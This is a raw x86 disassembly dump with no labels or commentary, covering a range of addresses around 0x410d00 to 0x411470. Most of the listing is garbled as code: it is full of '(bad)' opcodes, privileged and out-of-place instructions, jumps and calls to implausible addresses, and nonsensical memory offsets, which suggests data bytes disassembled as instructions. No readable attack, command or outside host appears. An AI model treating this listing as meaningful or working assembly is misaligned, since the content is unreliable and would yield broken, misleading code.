  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
